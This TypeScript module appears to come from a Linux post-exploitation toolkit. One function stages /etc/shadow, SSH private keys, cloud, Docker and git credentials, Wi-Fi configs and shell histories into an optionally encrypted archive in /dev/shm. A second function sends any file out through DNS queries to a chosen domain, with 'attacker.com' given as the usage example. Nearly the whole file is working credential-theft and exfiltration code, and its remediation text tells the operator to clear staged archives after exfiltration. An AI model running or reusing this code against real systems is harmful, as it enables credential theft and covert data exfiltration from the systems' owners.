import { bash, sh, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function dataStage(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Data Staging for Exfiltration ==="]

  const outDir = argVal(args, "--output-dir") || "/dev/shm"
  const encPass = argVal(args, "--encrypt")

  const script = `
OUTDIR="${outDir}"
mkdir -p "$OUTDIR" 2>/dev/null

echo "--- Locating Sensitive Files ---"
TARGETS=""

# Shadow / passwd
if [ -r /etc/shadow ]; then
  echo "[+] /etc/shadow (readable)"
  TARGETS="$TARGETS /etc/shadow"
fi
TARGETS="$TARGETS /etc/passwd"

# SSH keys
for dir in /root /home/*; do
  if [ -d "$dir/.ssh" ]; then
    for f in "$dir/.ssh/id_rsa" "$dir/.ssh/id_ecdsa" "$dir/.ssh/id_ed25519" "$dir/.ssh/id_dsa"; do
      if [ -r "$f" ]; then
        echo "[+] $f"
        TARGETS="$TARGETS $f"
      fi
    done
    [ -r "$dir/.ssh/authorized_keys" ] && TARGETS="$TARGETS $dir/.ssh/authorized_keys"
  fi
done

# Config files with credentials
for f in /etc/NetworkManager/system-connections/*.nmconnection \\
         /etc/wpa_supplicant/*.conf \\
         /etc/mysql/debian.cnf \\
         /etc/redis/redis.conf; do
  if [ -r "$f" ] 2>/dev/null; then
    echo "[+] $f"
    TARGETS="$TARGETS $f"
  fi
done

# Cloud creds
for dir in /root /home/*; do
  [ -r "$dir/.aws/credentials" ] && TARGETS="$TARGETS $dir/.aws/credentials" && echo "[+] $dir/.aws/credentials"
  [ -r "$dir/.docker/config.json" ] && TARGETS="$TARGETS $dir/.docker/config.json" && echo "[+] $dir/.docker/config.json"
  [ -r "$dir/.git-credentials" ] && TARGETS="$TARGETS $dir/.git-credentials" && echo "[+] $dir/.git-credentials"
done

# History files
for dir in /root /home/*; do
  for h in .bash_history .zsh_history; do
    [ -r "$dir/$h" ] && TARGETS="$TARGETS $dir/$h" && echo "[+] $dir/$h"
  done
done

echo ""
ARCHIVE="$OUTDIR/cs_stage_$(date +%s).tar.gz"
if [ -n "$TARGETS" ]; then
  tar czf "$ARCHIVE" $TARGETS 2>/dev/null
  echo "[+] Staged archive: $ARCHIVE ($(du -h "$ARCHIVE" 2>/dev/null | cut -f1))"
  ${encPass ? `openssl enc -aes-256-cbc -salt -pbkdf2 -in "$ARCHIVE" -out "$ARCHIVE.enc" -pass pass:"${encPass}" 2>/dev/null && rm -f "$ARCHIVE" && echo "[+] Encrypted: $ARCHIVE.enc" || echo "[-] Encryption failed — unencrypted archive remains"` : `echo "[*] No encryption requested — use --encrypt <password> to encrypt"`}
else
  echo "[-] No readable sensitive files found"
fi
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const stagedFiles = (r.stdout.match(/\[\+\]/g) || []).length
  if (r.stdout.includes("Staged archive")) {
    findings.push({
      checkId: "LNX-STAGE-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "STAGED",
      resource: outDir,
      title: "Sensitive data staged for exfiltration",
      details: `${stagedFiles} sensitive file(s) staged to ${outDir}. ${encPass ? "Archive encrypted with AES-256-CBC." : "Archive is NOT encrypted."}`,
      remediation: "Ensure cleanup_linux is run before leaving. Remove staged archives immediately after exfiltration.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function dnsTunnelExfil(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== DNS Tunnel Exfiltration ==="]

  const dataFile = argVal(args, "--data-file")
  const domain = argVal(args, "--domain")

  if (!dataFile || !domain) {
    output.push("Usage: linuxhook dns_tunnel_exfil --data-file /path/to/file --domain attacker.com")
    output.push("Data is encoded as hex subdomains: <chunk>.attacker.com")
    return { output: output.join("\n"), findings }
  }

  const script = `
if [ ! -r "${dataFile}" ]; then
  echo "[-] Cannot read ${dataFile}"
  exit 1
fi

echo "[*] Encoding ${dataFile} for DNS exfiltration to ${domain}"
FILESIZE=$(wc -c < "${dataFile}" 2>/dev/null)
echo "[*] File size: $FILESIZE bytes"

# Split into 30-byte chunks (60 hex chars fits in DNS label)
CHUNKS=$(xxd -p "${dataFile}" 2>/dev/null | fold -w 60)
TOTAL=$(echo "$CHUNKS" | wc -l)
echo "[*] Total chunks: $TOTAL"

COUNT=0
if command -v dig >/dev/null 2>&1; then
  echo "[*] Using dig for DNS queries"
  echo "$CHUNKS" | while read -r chunk; do
    COUNT=$((COUNT+1))
    dig +short "$COUNT.$chunk.${domain}" A >/dev/null 2>&1
  done
elif command -v nslookup >/dev/null 2>&1; then
  echo "[*] Using nslookup for DNS queries"
  echo "$CHUNKS" | while read -r chunk; do
    COUNT=$((COUNT+1))
    nslookup "$COUNT.$chunk.${domain}" >/dev/null 2>&1
  done
elif command -v python3 >/dev/null 2>&1; then
  echo "[*] Using python3 for DNS queries"
  python3 -c "
import socket, sys
chunks = open('${dataFile}','rb').read().hex()
n = 60
parts = [chunks[i:i+n] for i in range(0,len(chunks),n)]
for i,p in enumerate(parts):
    try: socket.getaddrinfo(f'{i}.{p}.${domain}', None)
    except: pass
print(f'Sent {len(parts)} chunks')
" 2>/dev/null
else
  echo "[-] No DNS query tool available (dig, nslookup, or python3 required)"
  exit 1
fi

echo "[+] DNS exfiltration complete — $TOTAL chunks sent to ${domain}"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("exfiltration complete")) {
    const chunks = r.stdout.match(/Total chunks: (\d+)/)?.[1] || "unknown"
    findings.push({
      checkId: "LNX-DNSTUN-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "EXFILTRATED",
      resource: dataFile,
      title: "Data exfiltrated via DNS tunneling",
      details: `${chunks} DNS chunks sent to ${domain}. Data encoded as hex subdomains in A record queries.`,
      remediation: "Monitor DNS query logs for unusual subdomain patterns. Implement DNS query length limits.",
    })
  }

  return { output: output.join("\n"), findings }
}
